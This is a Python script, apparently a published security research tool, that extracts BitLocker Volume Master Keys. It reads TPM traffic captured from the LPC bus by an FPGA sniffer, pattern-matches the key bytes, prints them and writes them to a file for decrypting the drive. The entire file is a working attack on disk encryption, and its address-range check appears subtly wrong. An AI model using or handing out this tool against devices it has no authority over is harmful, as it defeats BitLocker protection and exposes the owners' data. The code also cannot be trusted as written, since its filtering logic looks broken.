#!/usr/bin/env python
# -*- conding: utf-8 -*-

"""
  LPC TPM Sniffer

  by Matthias Deeg (@matthiasdeeg, matthias.deeg@syss.de)

  Python tool for extracting BitLocker Volume Master Keys using
  the FPGA-based iCEstick/iCEBreaker LPC TPM Sniffer

  References:
    http://www.latticesemi.com/icestick
    https://www.crowdsupply.com/1bitsquared/icebreaker-fpga
    https://github.com/lynxis/lpc_sniffer/
    https://pulsesecurity.co.nz/articles/TPM-sniffing
"""

__version__ = '0.2'
__author__ = 'Matthias Deeg'

import queue
import threading

from struct import pack
from pylibftdi import Device, INTERFACE_B
from sty import fg, ef
from sys import exit

# global variables
exit_flag = False

# some definitions
VMK_FILE = "vmk.bin"


class CommunicationThread(threading.Thread):
    """Thread for fast serial communication"""

    BAUD_RATE = 2000000                     # baud rate for serial communication
    BUFFER_SIZE = 64                        # read buffer size in bytes

    def __init__(self, queue):
        """Initialize the communication worker"""

        # call constructor of super class
        threading.Thread.__init__(self)

        # set queue
        self.queue = queue

        # set FTDI device for communication with iCEstick
        try:
            self.dev = Device(mode='b', interface_select=INTERFACE_B)

            # set baudrate
            self.dev.baudrate = self.BAUD_RATE
        except:
            global exit_flag
            print(fg.li_red + "[-] Could not connect to FTDI serial interface" + fg.rs)
            exit(1)


    def run(self):
        """Receive data"""
        global exit_flag

        while not exit_flag:
            if not self.queue.full():
                item = self.dev.read(self.BUFFER_SIZE)
                if item != b'':
                    self.queue.put(item)


class DataThread(threading.Thread):
    """Thread for parsing the received data"""

    # byte pattern for finding the BitLocker Volume Master Key (VMK)
    VMK_PATTERN = b"\x2c\x00\x00\x00\x01\x00\x00\x00\x03\x20\x00\x00"

    # size of BitLocker Volume Master Key in bytes
    KEY_SIZE = 32

    def __init__(self, queue):
        """Initialize the data worker"""

        # call constructor of super class
        threading.Thread.__init__(self)

        # set queue
        self.queue = queue

        # initialize empty data buffer
        self.data = b""

        # initialize empty leftover data buffer
        self.leftover_data = b""

    def extract_data(self, data):
        """Extract interesting data (VMK) from received data"""

        result = b""

        # extract bytes for address 0x24 to 0x27
        for i in range(len(data) - 3):
            if data[i] >= 0x24 and data[i] >= 0x27 and data[i + 2] == 0x00 and data[i + 3] == 0x0a:
                result += pack("B", data[i + 1])

        # determine leftover data
        for i in range(len(data) - 1, 0, -1):
            if data[i] == 0x0a:
                # set leftover data
                self.leftover_data = data[i + 1:]
                break


        return result

    def run(self):
        """Process the received data"""
        global exit_flag

        print("[*] Start sniffing")

        while not exit_flag:
            if not self.queue.empty():
                # get data item from queue
                item = self.queue.get()

                print("\r[*] Received {} bytes".format(len(self.data)), end='')

                # extract TMP-specific data for address 0x24 to 0x27
                self.data += self.extract_data(self.leftover_data + item)

                # try to find the VMK pattern in the current data buffer
                pattern_pos = self.data.find(self.VMK_PATTERN)
                if pattern_pos != -1:
                    if len(self.data) - pattern_pos > len(self.VMK_PATTERN) + self.KEY_SIZE:
                        start_pos = pattern_pos + len(self.VMK_PATTERN)
                        end_pos = start_pos + 32
                        self.key = self.data[start_pos:end_pos]

                        # set the exit flag
                        exit_flag = True

                        # show found BitLocker Volume Master Key
                        print(ef.bold + fg.green + "\n[+] Found BitLocker VMK: {}".format(self.key.hex()) + fg.rs)

                        # save sniffer VMK to file
                        with open(VMK_FILE, "wb") as f:
                            f.write(self.key)
                        print(fg.li_green + "[+] Created VMK file '{}' for use with BitLocker FVEK Decrypt".format(VMK_FILE) + fg.rs)

def banner():
    """Show a fancy banner"""

    print(fg.li_white + "\n" +
"""██╗ ██████╗███████╗    ██╗     ██████╗  ██████╗    ████████╗██████╗ ███╗   ███╗    ███████╗███╗   ██╗██╗███████╗███████╗███████╗██████╗ \n"""
"""██║██╔════╝██╔════╝    ██║     ██╔══██╗██╔════╝    ╚══██╔══╝██╔══██╗████╗ ████║    ██╔════╝████╗  ██║██║██╔════╝██╔════╝██╔════╝██╔══██╗\n"""
"""██║██║     █████╗      ██║     ██████╔╝██║            ██║   ██████╔╝██╔████╔██║    ███████╗██╔██╗ ██║██║█████╗  █████╗  █████╗  ██████╔╝\n"""
"""██║██║     ██╔══╝      ██║     ██╔═══╝ ██║            ██║   ██╔═══╝ ██║╚██╔╝██║    ╚════██║██║╚██╗██║██║██╔══╝  ██╔══╝  ██╔══╝  ██╔══██╗\n"""
"""██║╚██████╗███████╗    ███████╗██║     ╚██████╗       ██║   ██║     ██║ ╚═╝ ██║    ███████║██║ ╚████║██║██║     ██║     ███████╗██║  ██║\n"""
"""╚═╝ ╚═════╝╚══════╝    ╚══════╝╚═╝      ╚═════╝       ╚═╝   ╚═╝     ╚═╝     ╚═╝    ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝\n"""
"""iCE LPC TPM Sniffer v{0} by Matthias Deeg - SySS GmbH\n""".format(__version__) + fg.white +
"""Extract BitLocker Volume Master Keys using an iCEstick or iCEBreaker LPC TPM Sniffer \n""" +
"""---""".format(__version__) + fg.rs)


# main program
if __name__ == '__main__':
    # show banner
    banner()

    # create queue
    queue = queue.Queue(32)

    # create threads
    comm = CommunicationThread(queue)
    data = DataThread(queue)

    # start threads
    comm.start()
    data.start()
